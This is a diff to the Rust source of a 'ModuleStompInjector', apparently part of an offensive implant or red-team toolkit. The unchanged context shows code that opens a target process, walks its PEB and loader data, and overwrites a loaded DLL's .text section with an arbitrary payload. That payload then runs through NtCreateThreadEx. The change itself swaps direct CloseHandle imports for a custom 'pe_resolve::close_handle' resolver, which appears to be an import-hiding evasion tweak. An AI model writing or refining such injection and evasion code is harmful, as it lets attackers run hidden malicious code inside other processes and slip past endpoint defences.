@@ -7,7 +7,6 @@ pub struct ModuleStompInjector;
 impl Injector for ModuleStompInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
         use std::mem::size_of;
-        use winapi::um::handleapi::CloseHandle;
         use winapi::um::memoryapi::{
             ReadProcessMemory, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory,
         };
@@ -100,7 +99,7 @@ impl Injector for ModuleStompInjector {
             ntqip(h_proc, 0, pbi.as_mut_ptr() as _, 48, &mut ret_len);
             let peb_addr = u64::from_le_bytes(pbi[8..16].try_into().unwrap()) as usize;
             if peb_addr == 0 {
-                CloseHandle(h_proc);
+                pe_resolve::close_handle(h_proc);
                 return Err(anyhow!("Failed to get target PEB address"));
             }
 
@@ -117,7 +116,7 @@ impl Injector for ModuleStompInjector {
                 &mut bytes_read,
             );
             if ldr_ptr == 0 {
-                CloseHandle(h_proc);
+                pe_resolve::close_handle(h_proc);
                 return Err(anyhow!("Failed to read target Ldr pointer"));
             }
 
@@ -390,7 +389,7 @@ impl Injector for ModuleStompInjector {
                             h_thread,
                             winapi::um::winbase::INFINITE,
                         );
-                        CloseHandle(h_thread);
+                        pe_resolve::close_handle(h_thread);
                     }
                     winapi::um::memoryapi::VirtualFreeEx(
                         h_proc,
@@ -463,7 +462,7 @@ impl Injector for ModuleStompInjector {
                 }
 
                 if target_base == 0 {
-                    CloseHandle(h_proc);
+                    pe_resolve::close_handle(h_proc);
                     return Err(anyhow!(
                         "ModuleStompInjector: no loaded module with a .text section large enough to accommodate the payload ({} bytes)",
                         payload.len()
@@ -483,7 +482,7 @@ impl Injector for ModuleStompInjector {
                 &mut bytes_read,
             );
             if dos_header.e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
-                CloseHandle(h_proc);
+                pe_resolve::close_handle(h_proc);
                 return Err(anyhow!("Invalid DOS signature on target DLL"));
             }
 
@@ -525,11 +524,11 @@ impl Injector for ModuleStompInjector {
             }
 
             if text_rva == 0 {
-                CloseHandle(h_proc);
+                pe_resolve::close_handle(h_proc);
                 return Err(anyhow!("Failed to find .text section of target DLL"));
             }
             if payload.len() > text_size as usize {
-                CloseHandle(h_proc);
+                pe_resolve::close_handle(h_proc);
                 return Err(anyhow!("Payload larger than target .text section"));
             }
 
@@ -579,16 +578,16 @@ impl Injector for ModuleStompInjector {
                 std::ptr::null_mut(),
             );
             if exec_status >= 0 && !h_exec_thread.is_null() {
-                CloseHandle(h_exec_thread);
+                pe_resolve::close_handle(h_exec_thread);
             } else {
-                CloseHandle(h_proc);
+                pe_resolve::close_handle(h_proc);
                 return Err(anyhow!(
                     "NtCreateThreadEx execution failed: {:x}",
                     exec_status
                 ));
             }
 
-            CloseHandle(h_proc);
+            pe_resolve::close_handle(h_proc);
         }
         Ok(())
     }
